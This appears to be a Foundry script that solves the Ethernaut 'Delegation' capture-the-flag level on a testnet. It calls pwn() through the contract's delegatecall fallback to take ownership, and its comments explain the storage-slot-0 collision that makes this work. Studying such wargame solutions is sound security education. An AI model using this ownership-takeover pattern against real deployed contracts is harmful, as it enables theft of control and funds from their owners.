// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Delegation} from "../src/Delegation.sol";

// $ source .env      # This is to store the environmental variables in the shell session
// $ forge script script/Delegation.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv

contract DelegationSolution is Script {

    // get the environmental variables
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    // this is the instance address created by the ethernaut contract
    address public instance = (vm.envAddress("DELEGATION_INSTANCE"));

    /* Attack idea:
    The Delegate contract is vulnerable to a delegatecall attack. The Delegation contract has a fallback function that calls delegatecall on the Delegate contract. 
    The Delegate contract has a pwn function that sets the owner to the caller of the function. 
    The goal is to call the pwn function of the Delegate contract through the Delegation contract.
    We need to change the owner of the Delegation contract via delegate call
    Notice that both have the owner variable in slot 0, so we can change the owner of the Delegation contract by calling the pwn function of the Delegate contract
    Delegatecall is used to execute code in the context of the calling contract, not the called contract.
    */

    function run() external {
        vm.startBroadcast(deployerPrivateKey);
        // create the Delegate contract
        Delegation delegationInstance = Delegation(instance);
        // call the pwn function of the Delegate contract through the Delegation contract
        // Notice that we need to cast it to address to call the pwn function (or the compiler will throw an error)
        (bool success, ) = address(delegationInstance).call(abi.encodeWithSignature("pwn()"));
        require(success, "Call failed");
        vm.stopBroadcast();
    }
}


